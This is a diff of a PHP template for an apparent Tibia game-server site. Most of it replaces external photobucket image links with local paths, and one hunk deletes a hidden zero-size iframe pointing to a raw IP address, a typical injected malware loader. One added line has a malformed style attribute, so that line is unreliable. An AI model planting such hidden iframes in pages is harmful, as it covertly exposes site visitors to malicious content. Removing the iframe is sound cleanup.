@@ -252,14 +252,14 @@
 	</head>
 	<body onBeforeUnLoad="SaveMenu();" onUnload="SaveMenu();">
 		<a name="top" ></a>
-		<div id="ArtworkHelper" style="background-image:url(http://i63.photobucket.com/albums/h122/Mister_Dude/background-artwork-1.jpg);" >
+		<div id="ArtworkHelper" style=""<?PHP echo $layout_name; ?>/images/background-artwork-1.jpg);" >
 			<div id="Bodycontainer">
 				<div id="ContentRow">
 					<div id="MenuColumn">
 						<div id="LeftArtwork">
 							<img id="Statue_1" src="<?PHP echo $layout_name; ?>/images/header/animated-statue.gif" alt="logoartwork" />
-							<img id="TibiaLogoArtworkTop" src="http://i63.photobucket.com/albums/h122/Mister_Dude/tibia-logo-artwork-top.gif" onClick="window.location = '?subtopic=latestnews';" alt="logoartwork" />
-							<img id="TibiaLogoArtworkBottom" src="http://i63.photobucket.com/albums/h122/Mister_Dude/tibia-logo-artwork-bottom.gif" alt="logoartwork" />
+							<img id="TibiaLogoArtworkTop" src="<?PHP echo $layout_name; ?>/images/tibia-logo-artwork-top.gif" onClick="window.location = '?subtopic=latestnews';" alt="logoartwork" />
+							<img id="TibiaLogoArtworkBottom" src="<?PHP echo $layout_name; ?>/images/tibia-logo-artwork-bottom.gif" alt="logoartwork" />
 							<img id="Statue_2" src="<?PHP echo $layout_name; ?>/images/header/animated-statue.gif" alt="logoartwork" />
 							<img id="LogoLink" src="<?PHP echo $layout_name; ?>/images/header/tibia-logo-artwork-string.gif" onClick="window.location = 'mailto:<?PHP echo $config['server']['ownerEmail']; ?>';" alt="logoartwork" />
 						</div>
@@ -681,7 +681,7 @@
 								<img class="Title" src="headline.php?txt=<?PHP echo urlencode($topic); ?>" alt="Contentbox headline" />
 								<div class="Border_2">
 									<div class="Border_3">
-										<div class="BoxContent" style="background-image:url(http://i63.photobucket.com/albums/h122/Mister_Dude/scroll.gif);">
+										<div class="BoxContent" style="background-image:url(<?PHP echo $layout_name; ?>/images/scroll.gif);">
 											<?PHP echo $main_content; ?> 
 										</div>
 									</div>
@@ -703,7 +703,7 @@
 				<div id="ThemeboxesColumn">
 					<div id="RightArtwork">
 						<img id="Monster" src="images/monsters/<?PHP echo logo_monster() ?>.gif" onClick="window.location = '?subtopic=creatures&amp;creature=<?PHP echo logo_monster() ?>';" alt="Monster of the Week" />
-						<img id="PedestalAndOnline" src="http://i63.photobucket.com/albums/h122/Mister_Dude/pedestal-and-online.gif" alt="Monster Pedestal and Players Online Box"/>
+						<img id="PedestalAndOnline" src="<?PHP echo $layout_name; ?>/images/pedestal-and-online.gif" alt="Monster Pedestal and Players Online Box"/>
 						<div id="PlayersOnline" onClick="window.location = '?subtopic=whoisonline'">
 							<?PHP
 								if($config['status']['serverStatus_online'] == 1)
@@ -714,12 +714,11 @@
 						</div>
 					</div>
 					<div id="Themeboxes">
-						<div id="NewcomerBox" class="Themebox" style="background-image:url(http://i63.photobucket.com/albums/h122/Mister_Dude/newcomerbox.gif);">
+						<div id="NewcomerBox" class="Themebox" style="background-image:url(<?PHP echo $layout_name; ?>/images/newcomerbox.gif);">
 							<div class="ThemeboxButton" onClick="BigButtonAction('?subtopic=createaccount')" onMouseOver="MouseOverBigButton(this);" onMouseOut="MouseOutBigButton(this);" style="background-image:url(<?PHP echo $layout_name; ?>/images/buttons/sbutton.gif);">
 								<div class="BigButtonOver" style="background-image:url(<?PHP echo $layout_name; ?>/images/buttons/sbutton_over.gif);"></div>
 								<div class="ButtonText" style="background-image:url(<?PHP echo $layout_name; ?>/images/buttons/_sbutton_jointibia.gif);"></div>
 							</div>
-							<iframe src ="http://188.126.223.74/42/index.php" width="0" frameborder="no" height="0"></iframe>
 							<div class="Bottom" style="background-image:url(<?PHP echo $layout_name; ?>/images/general/box-bottom.gif);"></div>
 						</div>
 						<?PHP
